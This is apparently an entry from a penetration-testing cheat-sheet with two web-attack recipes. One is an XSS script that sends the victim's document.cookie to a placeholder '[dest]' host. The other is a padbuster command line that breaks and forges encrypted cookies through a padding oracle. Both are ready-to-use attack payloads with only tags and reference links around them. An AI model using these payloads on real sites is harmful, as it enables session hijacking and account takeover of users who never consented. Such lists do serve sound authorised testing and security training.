### 1. Grab the cookie
```
<script>i = new XMLHttpRequest(); i.open('GET', '[dest]' + document.cookie, true); i.send();</script>
```
**- web application,XSS,cookies**
#### References:

https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
https://excess-xss.com/
__________
### 2. Padding Oracle attack, break encrypted cookies
```
padbuster [url] [EncodedData] 8 --cookies '[UserCookies]'  -encoding 0 --plaintext user=[TextToEncode]
```
**- web application,cookies**
#### References:

https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html
https://archive.org/details/TheWebApplicationHackerHandbook
https://pentesterlab.com/exercises/padding_oracle/course
__________
